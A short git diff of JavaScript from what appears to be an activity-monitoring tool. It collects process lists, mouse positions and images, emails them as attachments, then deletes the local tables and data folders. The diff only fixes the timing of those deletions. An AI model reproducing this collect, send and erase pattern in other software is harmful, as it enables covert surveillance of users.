@@ -54,6 +54,7 @@ let removeDirData = function removeData(datapath) {
   });
 }
 
+
 let sendData = function(msg, file) {
   HelperOptions.attachments = file;
   HelperOptions.subject = msg.subject;
@@ -63,13 +64,11 @@ let sendData = function(msg, file) {
       if (error) {
         console.log(error);
       } else {
-
         const dataPack = uData + '/data/dataPack',
               emailData = uData + '/data/emailData';
-        setTimeout(removeData.emptyAllTables(['ActiveProcesses', 'MousePos', 'Processes', 'images','Temp']),3000);
-        setTimeout(removeDirData(dataPack),3000);
-        setTimeout(removeDirData(emailData),3000);
-
+        setTimeout(removeData.emptyAllTables(['ActiveProcesses', 'MousePos', 'Processes', 'images','Temp']),5000);
+        setTimeout(removeDirData,4000,dataPack);
+        setTimeout(removeDirData,5000,emailData);
       }
     });
   }
